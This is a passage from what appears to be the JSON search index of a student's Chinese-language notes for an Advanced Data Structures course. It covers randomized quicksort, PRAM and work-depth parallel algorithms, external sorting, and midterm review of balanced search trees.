<p>\u200b\u200b</p>"},{"location":"ZJU-course/ADS/ADS/#quick-sort","title":"quick sort","text":"<p>\u6211\u4eec\u5728FDS\u8bfe\u4e0a\u5b66\u4e60\u8fc7\u4e86deterministic quicksort\uff0c\u5176\u6700\u574f\u65f6\u95f4\u590d\u6742\u5ea6\u662fN^2\uff0c\u5e73\u5747\u65f6\u95f4\u590d\u6742\u5ea6\u662fNlogN</p> <p>\u800c\u5f71\u54cdquick sort\u6548\u7387\u7684\u5173\u952e\u5c31\u662fpivot\uff0c\u6211\u4eec\u5b9a\u4e49\u4e00\u4e2acentral splitter\uff0c\u5176\u8868\u793apivot\u7684\u5206\u5272\u7684\u4e24\u90e8\u5206\u81f3\u5c11\u5360\u603b\u5143\u7d20\u7684n/4\uff0c\u5728\u6b64\u79cd\u6761\u4ef6\u4e4b\u4e0b\u6211\u4eec\u53ef\u4ee5\u4fdd\u8bc1NlogN\u7684\u65f6\u95f4\u590d\u6742\u5ea6\uff0c</p> <p>\u6211\u4eec\u8fdb\u884c\u5206\u6790\uff0c\u6211\u4eec\u627e\u5230\u4e00\u4e2acentral splitter\u7684\u6240\u9700\u8fed\u4ee3\u662f\u6700\u591a\u4e24\u6b21</p> <p>\u5982\u679c\u6211\u4eec\u968f\u4fbf\u9009pivot\uff0c\u5f88\u663e\u7136\u670950%\u7684\u6982\u7387\u80fd\u9009\u5230central splitter</p> <p>\u200b\u200b</p> <p>\u663e\u7136\u6211\u4eec\u671f\u671b\u7684\u6bcf\u6b21\u627ecentral splitters\u7684\u6b21\u6570\u662f\u4e24\u6b21</p> <p>\u5728\u6bcf\u6b21\u90fd\u627e\u5230central splitter\u7684\u60c5\u51b5\u4e0b\uff0c\u6211\u4eec\u6765\u8fdb\u884c\u5206\u6790</p> <p>\u200b\u200b</p> <p>\u200d</p>"},{"location":"ZJU-course/ADS/ADS/#parallel-algorithm","title":"parallel algorithm","text":"<p>PPT\u6539\u8fc7\u4e86\uff0cpta\u4e0a\u662f\u65b0\u7684</p> <p>\u5bf9\u4e8e\u5e76\u884c\u6211\u4eec\u6709\u4e24\u4e2a\u65b9\u5411</p> <ul> <li>machine parallelism\uff0c\u5305\u62ecProcessos parallelism, pipelining\u7b49\u7b49</li> <li>parallel algorithms \u662f\u8fd9\u4e00\u8282\u8bfe\u7684\u4e3b\u9898</li> </ul> <p>\u6211\u4eec\u9700\u8981\u6839\u636e\u4e00\u4e9b\u6a21\u578b\u6765\u63cf\u8ff0\u5e76\u884c\u7b97\u6cd5</p> <ul> <li>PRAM parallel random access machine</li> <li>WD Work-Depth</li> </ul> <p>\u8fd9\u4e24\u79cd\u6a21\u578b\u672c\u8d28\u662f\u7b49\u4ef7\u7684\uff0c\u4f46\u662f\u63d0\u4f9b\u4e86\u4e0d\u540c\u7684\u89c6\u89d2</p>"},{"location":"ZJU-course/ADS/ADS/#pram-model","title":"PRAM model","text":"<p>\u6211\u4eec\u6709\u591a\u4e2a\u5904\u7406\u5668\u548c\u4e00\u4e2a\u5171\u4eab\u7684\u5185\u5b58\uff0c\u5e76\u4e14\u662funit time access\uff0c\u5bf9\u4e8e\u5185\u5b58\u7684\u8bfb\u548c\u5199\u662f\u4e00\u4e2a\u5355\u4f4d\uff0c\u5bf9\u4e8e\u4e00\u4e2a\u5355\u4f4d\u540c\u65f6\u6709\u591a\u4e2a\u8bfb\u6ca1\u95ee\u9898\uff0c\u4f46\u662f\u6709\u591a\u4e2a\u5199\u53ef\u80fd\u5c31\u4f1a\u51b2\u7a81\u4e86\u3002\u8981\u89e3\u51b3\u51b2\u7a81\u4e5f\u9700\u8981\u5236\u5b9a\u4e00\u7cfb\u5217\u7684\u7b56\u7565\u3002</p> <ul> <li>EREW \u6700\u591a\u53ea\u6709\u4e00\u4e2a\u5904\u7406\u5668\u53ef\u4ee5\u8bfb/\u5199</li> <li>CREW \u591a\u8bfb\u5355\u4e00\u7684\u5199</li> <li> <p>CRCW \u5141\u8bb8\u591a\u8bfb\u591a\u5199\uff0c\u5bf9\u4e8eCRCW\u6709\u51e0\u4e2a\u89c4\u5219\u53ef\u4ee5\u9009\u62e9</p> </li> <li> <p>Arbitary rule \u968f\u673a\u9009\u4e00\u4e2a</p> </li> <li>Priority rule \u9009\u6700\u5c0fnumber</li> <li>Common rule \u53ea\u5f53\u5199\u540c\u4e00\u4e2avalue\u7684\u65f6\u5019\u624d\u5141\u8bb8\u540c\u65f6\u5199</li> </ul> <p>summation problem</p> <p>\u628aA1\u52a0\u5230An\uff0c\u5148\u5168\u53d6\u51fa\u6765\uff0c\u6c42\u548c\uff0c\u663e\u7136\u662f\u4e00\u4e2a\u7ebf\u6027\u7684\u7b97\u6cd5\uff0c\u4f46\u662f\u6211\u4eec\u53ef\u4ee5\u505a\u4e00\u4e9b\u4f18\u5316</p> <p>\u200b\u200b</p> <p>\u7b2c\u4e00\u6b65\u6211\u4eec\u67098\u4e2aProcessers\uff0c\u5c06\u8fd9\u4e9b\u6570\u636e\u5b58\u52308\u4e2a\u56fa\u5b9a\u4f4d\u7f6eB(0, i) \uff0c\u7b2c\u4e00\u4e2a\u6570\u5b57\u4ec5\u8868\u793a\u8f6e\u6570\uff0c\u4e0d\u5f71\u54cd\u5177\u4f53\u4f4d\u7f6e\uff1b\u968f\u540e\u6211\u4eec\u4f1a\u67094\u4e2aProcesser\uff0c\u505a\u4e24\u4e24\u76f8\u52a0\uff0c\u5faa\u73af\u7684\u516c\u5f0f\u662f</p> \\[ B(h,i)=B(h-1,2i-1)+B(h-1,2i) \\] <p>\u4e0b\u9762\u662f\u4f2a\u4ee3\u7801</p> <p>\u200b\u200b</p> <p>\\(T(n) = \\log n+2\\) \u4e0b\u56fe\u662f\u5173\u4e8e\u8be5\u7b97\u6cd5\u7684\u4e00\u5f20\u5206\u6790\u56fe\uff0c\u53ef\u4ee5\u770b\u5230\u968f\u7740\u65f6\u95f4\u8fdb\u884c\uff0c\u5355\u4f4d\u65f6\u95f4\u5185\u5728\u505a\u4e8b\u7684\u7ebf\u7a0b\u8d8a\u6765\u8d8a\u5c11\u4e86\u3002</p> <p>\u200b\u200b</p> <p>\u6807\u51c6\u7684PRAM\u6709\u4e00\u4e9b\u7f3a\u70b9</p> <ul> <li>\u6211\u4eec\u65e0\u6cd5\u5224\u65adprocessor\u7684\u6570\u91cf\u5bf9\u4e8e\u7b97\u6cd5\u6548\u7387\u7684\u5f71\u54cd</li> <li>Fully specifying the allocation of instructions to processors requires a levle of detail which might be unnecessary \u6211\u4eec\u9700\u8981\u5bf9\u8fdb\u7a0b\u63d0\u4f9b\u4e00\u4e9b\u4e0d\u592a\u5fc5\u8981\u7684\u7ec6\u8282</li> </ul>"},{"location":"ZJU-course/ADS/ADS/#wd-model","title":"WD model","text":"<p>\u8fd9\u662f\u4e00\u6bb5\u4f2a\u4ee3\u7801\uff0c\u540c\u6837\u662f\u89e3\u51b3sum\u95ee\u9898\uff0c\u7528\u7684WD\u7684\u89c6\u89d2</p> <p>\u200b\u200b</p> <p>\u5176\u76f8\u5e94\u7684\u7b97\u6cd5\u63cf\u8ff0\u5982\u4e0b\uff0cpardo\u8868\u793a\u5f53\u524d\u53ea\u6709\u6ee1\u8db3\u524d\u7f6e\u6761\u4ef6\u7684\u7ebf\u7a0b\u9700\u8981\u8fd0\u884c</p> <p>\u200b\u200b</p> <p>\u4e0d\u8bba\u4f7f\u7528\u54ea\u79cdmodel\uff0c\u7b97\u6cd5\u8fd8\u662f\u90a3\u4e2a\u7b97\u6cd5\uff0c\u65f6\u95f4\u590d\u6742\u5ea6\u662f\u4e0d\u4f1a\u53d8\u7684</p>"},{"location":"ZJU-course/ADS/ADS/#measuring-the-performance","title":"measuring the performance","text":"<p>\u5bf9\u4e8e\u5e76\u884c\u8ba1\u7b97\u800c\u8a00\uff0c\u6211\u4eec\u6709\u4e24\u4e2a\u9700\u8981\u8003\u8651\u7684\u4e1c\u897f</p> <ul> <li>Work load\uff0c\u603b\u5f97\u64cd\u4f5c\u6570 W(n)</li> <li>Worst-case running time T(n)</li> </ul> <p>\u200b\u200b</p> <p>asymptotically equivalent</p> <p>\u200b\u200b</p> <p>\u5bf9\u6bd4\u7ebf\u6027\u7b97\u6cd5\uff0c\u6211\u4eec\u4f1a\u53d1\u73b0W(n)\u662f\u4e00\u6837\u7684 n\u8bfb + n-1\u7b97 +1\u5199</p> <p>WD\u8868\u793a\u8bf4\u660e\uff0c\u4efb\u4f55\u7b97\u6cd5\u5728WD mode \u53ef\u4ee5\u88abP(n)\u4e2aprocessor\u5b9e\u73b0\uff0c\u5728\\(O(W(n)/P(n)+T(n))\\) </p>"},{"location":"ZJU-course/ADS/ADS/#prefix-sums","title":"Prefix-Sums","text":"<p>\u95ee\u9898\u5f88\u7b80\u5355\uff0c\u8f93\u5165n\u4e2a\u6570\uff0c\u8f93\u51fa\u524d1\u4e2a\uff0c\u524d\u4e24\u4e2a\uff0c\u524d3\u4e2a\u3002\u3002\u3002\u524dn\u4e2a\u7684\u548c</p> <p>\u6211\u4eec\u4f7f\u7528balanced binary trees\uff0c\u901a\u8fc7\u4e00\u6b21\u5efa\u6811\u4ee5\u53ca\u4e00\u6b21\u9006\u5411\u8ba1\u7b97\uff0c\u83b7\u53d6\u6240\u6709\u7684\u524d\u7f00\u548c</p> <p>\u200b\u200b</p> <p>\u200b\u200b</p> <p>\u4f2a\u4ee3\u7801\u548c\u5206\u6790\u4e3a</p> <p>\u200b\u200b</p>"},{"location":"ZJU-course/ADS/ADS/#merge_1","title":"Merge","text":"<p>\u5408\u5e76\u4e24\u4e2a\u975e\u964d\u5e8f\u5217\u8868\uff0c\u5408\u5e76\u6210\u4e00\u4e2a\u5927\u7684\u975e\u964d\u5e8f\u5217\u8868</p> <p>\u6211\u4eec\u5c06\u4e00\u4e2a\u5408\u5e76\u95ee\u9898\u8f6c\u6362\u6210\u4e00\u4e2arank\u95ee\u9898\uff0crank\u7684\u5b9a\u4e49\u5982\u4e0b</p> <p>\u200b\u200b</p> <p>\u8fd9\u91cc\u6211\u4eec\u5148\u505a\u51fa\u4e00\u4e9b\u5047\u8bbe\uff0cm=n</p> <p>\u5982\u679c\u6211\u4eec\u77e5\u9053RANK\u7684\u7ed3\u679c\uff0c\u6211\u4eec\u53ef\u4ee5\u7528\u5e76\u884c\u7b97\u6cd5\uff0cO1\u7684\u65f6\u95f4\u548cO(n+m)\u7684\u5de5\u4f5c\u91cf\u6765\u5b8c\u6210\u5408\u5e76\u4efb\u52a1</p> <p>\u200b\u200b</p> <p>\u90a3\u4e48\u6211\u4eec\u5982\u4f55\u83b7\u5f97RANK\u7684\u7ed3\u679c\uff0c\u5bf9\u4e8e\u6709\u5e8f\u5217\u8868\uff0c\u6211\u4eec\u9996\u5148\u60f3\u5230\u7684\u662f\u4e8c\u5206\u641c\u7d22\uff0c\u65f6\u95f4\u590d\u6742\u5ea6\u662flogn\uff0c\u5bf9\u4e8e\u6bcf\u4e2a\u5143\u7d20\u505a\u4e00\u904dWn = nlogn\uff0cWn\u66f4\u5927\u4e86</p> <p>\u200b\u200b</p> <p>\u4f46\u6700\u597d\u6211\u4eec\u8fd8\u662f\u80fd\u6709\u4e00\u79cd\u7b97\u6cd5\uff0c\u5728logn\u7684\u65f6\u95f4\u590d\u6742\u5ea6\u5185\uff0c\u5e76\u4e14workload\u4e0d\u8981\u8d85\u8fc7n</p> <p>\u9996\u5148\u5047\u8bbe n = m \u5e76\u4e14\u5728A\u7684n+1\u548cB\u7684n+1\u4f4d\u7f6e\u90fd\u653e\u4e00\u4e2a\u6b63\u65e0\u7a77\u7684\u503c\uff0c\u4fbf\u4e8e\u6bd4\u8f83\u8ba1\u7b97</p> <p>\u6211\u4eec\u5fc5\u987b\u6709p = n/logn\u4e2aprocessors</p> <p>\u5148\u505a\u4e00\u4e2apartition\uff0c\u5206\u5272\u7684\u76ee\u7684\u662f\u4e3a\u4e86\u66f4\u597d\u5730\u5e76\u884c\uff0c\u6211\u4eec\u5c06\u5176\u5206\u6210p\u4e2a\u5b50\u95ee\u9898\uff0c\u6211\u4eec\u5148\u505a\u4e00\u4e2a\u9009\u62e9\uff0c\u5c06\u8fd9\u4e9b\u9009\u62e9\u5230\u7684\u5143\u7d20\u4f5c\u4e3a\u5b50\u95ee\u9898\u7684\u5f00\u5934\uff0c\u9009\u51fan/logn\u4e2a\u5143\u7d20</p> <p>\u628a\u8fd9\u4e9b\u5143\u7d20\u7684RANK\u505a\u597d\uff0c\u8fd9\u91cc\u662f\u8be5\u5143\u7d20\u5bf9\u6574\u4e2a\u6570\u5217\u7684RANK\uff0c\u505a\u597dRANK\u4e4b\u540e\u5c31\u5f97\u5230\u4e00\u4e2a\u4e2a\u7bad\u5934\uff0c\u5176\u5b9e\u5c31\u8868\u793a\u7740\u4ed6\u4eec\u7684RANK\uff0cselect\u7684\u65f6\u95f4\u590d\u6742\u5ea6\u662fOlogn\uff0c\u5f00\u9500\u662fOplogn = On</p> <p>\u200b\u200b</p> <p>\u6211\u4eec\u7684partition\u5c31\u662f\u628a\u8fd9\u4e2a\u95ee\u9898\u5207\u5272\u6210\u4e86\u4e00\u4e2a\u4e2a\u7684\u5b50\u95ee\u9898\uff0c\u5728\u8fd9\u91cc\u5c31\u662f\u6bcf\u4e24\u4e2a\u7bad\u5934\u4e4b\u95f4\uff0c\u90fd\u662f\u4e00\u4e2a\u5b50\u95ee\u9898\uff0cbelike</p> <p>\u200b\u200b</p> <p>\u4e0d\u8bba\u7bad\u5934\u7684\u6307\u5411\uff0c\u5176RANK\u90fd\u4e0d\u4f1a\u5c0f\u4e8e\u5de6\u4fa7\u7bad\u5934\u6216\u8005\u5927\u4e8e\u53f3\u4fa7\u7bad\u5934\uff0c\u4e8e\u662f\u5c31\u6210\u529f\u5212\u5206\u4e86\u51e0\u4e2a\u5b50\u95ee\u9898\uff0c\u90a3\u4e48\u6211\u4eec\u63a5\u4e0b\u6765\u770b\u5b50\u95ee\u9898</p> <p>\u5b50\u95ee\u9898\u6bcf\u4e2a\u7684size\u90fd\u4e0d\u4f1a\u8d85\u8fc7logn\uff0c\u5206\u5757\u4e4b\u540e\u4e32\u884c\u5730\u7b97\uff0c\u65f6\u95f4\u590d\u6742\u5ea6\u4e3aOlogn \u5f00\u9500\u662fOplogn = On</p>"},{"location":"ZJU-course/ADS/ADS/#maximum-finding","title":"Maximum Finding","text":"<p>\u627e\u51fa\u4e00\u5806\u6570\u5b57\u91cc\u9762\u7684\u6700\u5927\u503c</p> <p>\u5176\u5b9e\u53ef\u4ee5\u548c\u6c42\u548c\u7528\u4e00\u6a21\u4e00\u6837\u7684\u7b97\u6cd5\u505a\uff0c\u5176\u7ed3\u679c\u662fTn = Ologn , Wn = On</p> <p>\u8fd9\u91cc\u6709\u4e00\u4e2a\u65b0\u7684 O1\u7b97\u6cd5\uff0c\u4f46\u662fW\u6bd4\u8f83\u5927\uff0c\u5c31\u662f\u8ba9\u6bcf\u4e2a\u6570\u5b57\u548c\u5269\u4e0bn-1\u4e2a\u6bd4\u8f83\uff0c\u5982\u679c\u6709\u6bd4\u4ed6\u5927\uff0c\u5c31\u5728\u4e00\u4e2a\u5730\u65b9\u8bb0\u5f55\u4e0b1\uff0c\u6574\u4e2aOn^2\u5e76\u884c\u5b8c\u4e4b\u540e\uff0c\u8fd8\u6ca1\u6709\u88ab\u6253\u4e0a\u6807\u8bb0\u7684\uff0c\u5c31\u662f\u6700\u5927\u503c</p> <p>\u200b\u200b</p> <p>\u770b\u4f3c\u6709\u5199\u51b2\u7a81\uff0c\u4f46\u662f\u7531\u4e8e\u5199\u5165\u7684\u6570\u5b57\u90fd\u662f1\uff0c\u5176\u5b9e\u6ca1\u5173\u7cfb\uff0cCRCW</p> <p>T(n) = O(1) W(n) = O(n^2)</p> <p>Double-logarithmic Paradigm</p> <p>\u662f\u5e0c\u671b\u964d\u4f4e\u4e0a\u8ff0\u7b97\u6cd5\u7684Workload</p> <p>\u505a\u4e00\u4e9b\u5047\u8bbe</p> <ul> <li>h = loglogn \u662f\u4e00\u4e2a\u6574\u6570\uff0c\u5bf9n\u6709\u8981\u6c42</li> <li>\u5207\u5272\u6210\\(\\sqrt{n}\\) \u4e2a\u5b50\u95ee\u9898\uff0c\u6bcf\u4e2a\u95ee\u9898\u7684\u89c4\u6a21\u4e5f\u662f\\(\\sqrt{n}\\)</li> </ul> <p>\u5207\u5272\u65b9\u5f0f\u5982\u4e0b\uff0c\u5207\u5272\u5b8c\u4e4b\u540e\u7684T\u548cW\u90fd\u5c06n\u66ff\u6362\u6210\\(\\sqrt{n}\\) </p> <p>\u200b\u200b</p> <p>M1\u662f\u6307\u7b2c\u4e00\u4e2a\u5b50\u95ee\u9898\u7684\u6700\u5927\u503c\uff0c\u5bf9\u4e8e\\(M_1\\)\u5230\\(M_{\\sqrt{n}}\\)\u7684\u6c42\u6700\u5927\u503c\uff0c\u6211\u4eec\u91c7\u7528\u4e0a\u8ff0\u7684O1\u4f46\u662f\u5927\u5f00\u9500\u7b97\u6cd5</p> <p>\u5b50\u95ee\u9898\u7684\u6c42\u89e3\uff0c\u5b50\u95ee\u9898\u548c\u5b50\u95ee\u9898\u4e4b\u95f4\u90fd\u662f\u5e76\u884c\u7684\uff0c\u5176\u65f6\u95f4\u590d\u6742\u5ea6\u662f\u6211\u4eec\u6839\u636e\u4e0d\u7b49\u5f0f\u6c42\u89e3\u53ef\u5f97\uff0c\u5bf9\u4e8e\u5b50\u95ee\u9898\u6211\u4eec\u540c\u6837\u4f7f\u7528\u76f8\u540c\u7684\u65b9\u6cd5\u5c06\u5176\u5207\u5272\u6210\u66f4\u5c0f\u7684\u5b50\u95ee\u9898\uff0c\u4e8e\u662f\u6211\u4eec\u6709\u4e0b\u9762\u7684\u4e0d\u7b49\u5f0f</p> <p>\u200b\u200b</p> <p>\u4e0a\u8ff0\u505a\u6cd5\u662f\u6309\u7167\\(\\sqrt{n}\\) \u5206\uff0c\u4f46\u540c\u65f6\u6211\u4eec\u8fd8\u53ef\u4ee5\u6839\u636eloglogn\u6765\u5206\uff0c\u7531\u4e8e\u5b50\u95ee\u9898\u89c4\u6a21\u5f88\u5c0f\uff0c\u6211\u4eec\u5c31\u4e0d\u505a\u9012\u5f52\uff0c\u800c\u662f\u91c7\u7528\u7ebf\u6027\u7b97\u6cd5\uff0cOh\u65f6\u95f4\u590d\u6742\u5ea6\u548c Oh workload h = loglogn</p> <p>\u96be\u70b9\u6765\u5230\u4e86\u627e\u5230\u8fd9\u4e2a\u5b50\u95ee\u9898\u89e3\u96c6\u5408\u6c42\u6700\u5927\u503c\u7684\u60c5\u51b5\uff0c\u6709n/(loglogn) \u4e2a\u5143\u7d20\uff0c\u6b64\u65f6\u6211\u4eec\u9009\u62e9\u662f\u8c03\u7528\u4e0a\u9762\u63d0\u5230\u7684\u90a3\u4e2a\u7b97\u6cd5\uff0c\u7528\\(\\sqrt{n}\\) \u5206\u5272</p> <p>\u200b\u200b</p> <p>random sampling </p>"},{"location":"ZJU-course/ADS/ADS/#external-sort","title":"External Sort","text":"<p>IO\u662f\u6700\u5927\u7684\u74f6\u9888</p> <p>\u6211\u4eec\u4e00\u822c\u4f1a\u4f7f\u7528merge sort\u5728\u5916\u90e8\u6392\u5e8f\u4e2d\uff0c\u9996\u5148\u6211\u4eec\u6765\u770b\u4e00\u4e2a\u4f8b\u5b50\uff0c\u5047\u8bbememory\u6700\u591a\u53ea\u80fd\u5b583\u4e2arecords\uff0c\u5177\u4f53\u7684\u6d41\u7a0b\u5982\u4e0b</p> <p>\u200b\u200b</p> <p>\u521d\u59cb\u7684\u6392\u5e8f\u5c31\u662f\u4efb\u610f\u7684\u4e00\u4e2a\u6392\u5e8f\u7b97\u6cd5\uff0c\u6bd4\u5982quicksort</p> <p>\u603b\u5f97run\u6570\uff0crun\u662f\u6307\u539f\u6570\u5217\u88ab\u5185\u5b58M\u505a\u5206\u5272\uff0c\u5c31\u662fN/M </p> <p>\u603b\u5f97pass\u6570 = 1+3 = \\(1+\\lceil\\log_2(N/M)\\rceil\\)</p> <p>\u5bf9\u4e8e\u4e00\u4e2a\u5916\u90e8\u6392\u5e8f\u800c\u8a00\uff0c\u6709\u4ee5\u4e0b\u5185\u5bb9\u662f\u6211\u4eec\u9700\u8981\u8003\u8651\u7684</p> <p>\u200b\u200b</p> <p>\u63a5\u4e0b\u6765\u6211\u4eec\u4f9d\u6b21\u8003\u8651\u8fd9\u4e9b\u76ee\u6807</p>"},{"location":"ZJU-course/ADS/ADS/#reduce-pass","title":"Reduce Pass","text":"<p>\u6211\u4eec\u53ef\u4ee5\u505ak-way merge\uff0c\u7528\u4e00\u4e2aksize\u7684\u6700\u5c0f\u5806\u6765\u7ef4\u62a4</p> <p>\u200b\u200b</p> <p>\u4f46\u662f\u76f8\u5e94\u7684\u7f3a\u9677\u5728\u4e8e\uff0c\u6211\u4eec\u7528\u4e86\u66f4\u591a\u7684tapes\uff0c\u5bf9\u4e8ek-way merge\uff0c\u6211\u4eec\u9700\u89812k tapes</p> <p>\u4ece\u65f6\u95f4\u590d\u6742\u5ea6\u800c\u8a00\uff0c\u63d0\u9ad8k\u4e0d\u5f71\u54cd\u65f6\u95f4\u590d\u6742\u5ea6 T(N)=kT(N/k)+cNlogk</p> <p>O(N) = \\(N\\log_kN*\\log k\\) </p> <p>\u63a5\u4e0b\u6765\u8003\u8651\u964d\u4f4etapes\u6570\u91cf\u7684\u60c5\u5f62\uff0c\u6211\u4eec\u53ef\u4ee5\u91c7\u7528split unevenly\u7684\u505a\u6cd5\u6765\u964d\u4f4e\u5bf9tapes\u7684\u9700\u6c42\uff0c\u4f46\u540c\u65f6\u4f1a\u63d0\u9ad8pass\u7684\u6570\u91cf</p> <p>\u5bf9\u4e8e\u4ec5\u67093tapes\uff0c\u76842-way merge\uff0c\u6211\u4eec\u8d77\u521d\u670934\u4e2aruns\uff0c\u6211\u4eec\u9700\u8981\u82b1\u8d391+6passes\u548c5copies\u7528\u5e38\u89c4\u505a\u6cd5\uff1bsplit unevenly \u9700\u8981\u82b1\u8d391+7 passes</p> <p>split unevenly\u7684\u5206\u5272\u6570\u91cf\u662f\u6709\u89c4\u5f8b\u7684\uff0c\u4e00\u822c\u662f\u6590\u6ce2\u90a3\u5951\u6570\u5217\uff0c\u53ef\u4ee5\u8bb2\u5230k+1 tapes</p> <p>\u200b\u200b</p> <p>\u5982\u679c\u4e00\u5f00\u59cb\u7684\u6570\u503c\u4e0d\u662f\u6590\u6ce2\u90a3\u5951\u6570\uff0c\u5c31\u5c06\u4ed6\u5411\u4e0a\u8865\u9f50\u6210\u6590\u6ce2\u90a3\u5951\u6570\uff0c\u8fd9\u4e2a\u5408\u5e76\u7b97\u6cd5\u53eb\u505aPolyphase merge\uff0c\u4e3b\u8981\u662f\u4e3a\u4e86\u964d\u4f4etape\u7684\u6570\u91cf</p>"},{"location":"ZJU-course/ADS/ADS/#buffer-handling","title":"buffer handling","text":"<p>\u6211\u4eec\u4e00\u822c\u4f1a\u628a\u5185\u5b58\u5206\u4e3ainput buffers\u548coutput buffer</p> <p>\u5bf9\u4e8e2-way merge\uff0c\u6211\u4eec\u4e00\u5f00\u59cb\u8003\u8651\u7684\u90fd\u662f\u4e24\u4e2ainput block\uff0c\u4e00\u4e2aoutput block\uff0c\u5982\u679c\u6211\u4eec\u53ef\u4ee5\u6709\u56db\u4e2ainput buffer\uff0c\u4e24\u4e2aoutput buffer\uff0c\u5c31\u53ef\u4ee5\u5b9e\u73b0\u66f4\u597d\u7684\u5e76\u884c</p> <p>\u5bf9\u4e8ek-way\u7684\uff0c\u6211\u4eec\u9700\u89812k\u4e2ainput buffer\u548c\u4e24\u4e2aoutput buffer\uff0c\u56e0\u4e3a\u5185\u5b58\u88ab\u5207\u5f97\u6bd4\u8f83\u5c0f\uff0c\u56e0\u6b64IO\u4f1a\u6bd4\u8f83\u5927\uff0c\u53cd\u800c\u6548\u7387\u4f1a\u964d\u4e0b\u6765</p>"},{"location":"ZJU-course/ADS/ADS/#run-generation-and-merge","title":"Run generation and merge","text":"<p>\u8ba9\u6bcf\u4e2arun\u90fd\u53d8\u5f97\u66f4\u957f\uff0c\u6392\u5e8f\u4f1a\u66f4\u6709\u6548\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u5806\u6392\u5e8f\uff0c\u5f53\u65b0\u52a0\u5165\u7684\u6570\u636e\u5927\u4e8e\u521a\u5220\u9664\u7684\u6570\u636e\u7684\u65f6\u5019\uff0c\u8ba9\u5176\u52a0\u5165\u5f53\u524drun\uff0c\u53cd\u4e4b\u5c31\u505c\u6b62\u63a5\u53d7\u65b0\u7684\u6570\u636e\u8fdb\u5165\u8be5run\uff08\u6700\u5f00\u59cb\u7684\u51e0\u4e2a\u6c38\u8fdc\u7b97\u662f\u8be5run\u7684\uff09</p> <p>\u7406\u60f3\u72b6\u6001\u80fd\u53d8\u6210L = 2M\uff0c\u4f46\u6700\u7406\u60f3\u53ef\u4ee5\u5230n</p> <p>how to minimize the merge time</p> <p>\u5bf9\u4e8e\u4e00\u7cfb\u5217\u4e0d\u540clength\u7684run\uff0c\u6211\u4eec\u6700\u597d\u91c7\u7528huffman tree\u7684\u5f62\u5f0f\u53bb\u5408\u5e76\u4ed6</p> <p>\u200b\u200b</p> <p>\u200b\u200b</p> <p>\u9009A</p> <p>\u200d</p>"},{"location":"ZJU-course/ADS/ZJU-course/ADS/%E6%9C%9F%E4%B8%AD%E5%A4%8D%E4%B9%A0/","title":"\u671f\u4e2d\u590d\u4e60","text":""},{"location":"ZJU-course/ADS/ZJU-course/ADS/%E6%9C%9F%E4%B8%AD%E5%A4%8D%E4%B9%A0/#_2","title":"\u5e73\u8861\u641c\u7d22\u6811","text":"<ul> <li>\u7a7a\u6811\u7684\u6df1\u5ea6\u662f -1</li> <li>\u7ed3\u8bba\uff1a\u5bf9\u4e8eAVL\u6811\u800c\u8a00\uff0c\u5047\u8bbe\u7a7a\u6811\u6df1\u5ea6\u4e3a-1\uff0c\u5219AVL\u6811\u6811\u9ad8\u548c\u6700\u5c0f\u8282\u70b9\u6570\u91cf\u7684\u5173\u7cfb\u548c\u6590\u6ce2\u90a3\u5951\u6570\u5217\u6210\u7ebf\u6027\u5173\u7cfb</li> <li> \\[   N_{h} = F_{h+3}-1   \\] </li> <li> <p>\u5176\u4e2dF\u662f\u6590\u6ce2\u90a3\u5951\u6570\u5217\u7684\u9879\\(F_1=1,F_2=1\\)</p> </li> <li> <p>AVL\u6811\u7684\u63d2\u5165</p> </li> <li> <p>\u64cd\u4f5c\u590d\u6742\u5ea6\uff1a\u63d2\u5165\uff0c\u5220\u9664\uff0c\u8bbf\u95ee\u90fd\u662flogN</p> </li> <li>\u7279\u6b8a\u5c5e\u6027\uff1a BF \\(BF(node) = h_L-h_R\\)</li> <li> <p>\u64cd\u4f5c</p> <ul> <li>\u63d2\u5165\uff0c\u63d2\u5165\u4e4b\u540e\uff0c\u5411\u4e0a\u66f4\u65b0BF\uff0c\u5982\u679c\u627e\u5230\u4e0d\u5bf9\u7684\uff0c\u5c31\u5728\u6b64\u8fdb\u884c\u65cb\u8f6c</li> <li>\u5220\u9664\uff0c\u6ca1\u6709\u591a\u7684\u8bf4\u660e</li> <li>\u8bbf\u95ee\uff0c\u6b63\u5e38BST</li> <li>\u5173\u4e8e\u65cb\u8f6c\uff0c\u65cb\u8f6c\u662f\u6839\u636eTrouble maker \u548c Trouble finder\u7684\u76f8\u5bf9\u4f4d\u7f6e\u51b3\u5b9a\u7684</li> <li>\u200b\u200b</li> <li>splay\u6811</li> </ul> </li> <li> <p>\u64cd\u4f5c\u590d\u6742\u5ea6\uff1a \u644a\u8fd8\u65f6\u95f4\u590d\u6742\u5ea6\u90fd\u662flogN</p> </li> <li>\u7279\u6b8a\u5c5e\u6027 \u65e0</li> <li> <p>\u64cd\u4f5c</p> <ul> <li>\u63d2\u5165 \u5148\u63d2\u5165\uff0c\u518d\u8f6c\u5230root\u8282\u70b9</li> <li>\u5220\u9664\uff0c\u5148\u627e\u5230\uff0c\u8f6c\u5230root\u8282\u70b9\uff0c\u518d\u5220\u9664\uff0c\u53ef\u4ee5\u627e\u5de6\u8fb9\u6700\u5927\uff0c\u79fb\u52a8\u5230\u6839\u8282\u70b9\uff0c\u518d\u5408\u5e76\uff0c\u4e5f\u53ef\u4ee5\u627e\u53f3\u8fb9\u6700\u5c0f\uff0c\u79fb\u52a8\u5230\u6839\u8282\u70b9\uff0c\u518d\u5408\u5e76   \u200b\u200b</li> <li>\u8bbf\u95ee\uff0c\u5148\u627e\u5230\uff0c\u518d\u8f6c\u5230root\u8282\u70b9</li> <li>splay\u6811\u7684\u63d2\u5165\u548c\u8bbf\u95ee</li> <li>\u644a\u8fd8\u5206\u6790*</li> <li>\u7ea2\u9ed1\u6811\u4efb\u4e00\u64cd\u4f5c\u7684\u65cb\u8f6c\u662f\u5e38\u6570\u65f6\u95f4</li> <li>\u7ea2\u9ed1\u6811\u7684\u9ad8\u5ea6\u548c\u5185\u90e8\u8282\u70b9\u7684\u95ee\u9898</li> <li>\u7ea2\u9ed1\u6811\u7684\u9ed1\u9ad8\u4ece\u591a\u5c11\u5f00\u59cb\u6570\uff0c\u8be5\u70b9\u5230NIL\u7684\u8def\u7a0b\u4e0a\u7684\u6240\u6709black node\u7684\u6570\u91cf\uff0cNIL\u8981\u7b97\uff0c\u672c\u8eab\u4e0d\u7b97</li> <li>In a Red-Black tree, the path from the root to the farthest leaf is no more than twice as long as the path from the root to the nearest leaf.    T</li> <li>\u200b\u200b</li> <li>B+\u6811 root\u548cleaves\u7684\u6570\u91cf\uff0c\u5bf9\u4e8eorder 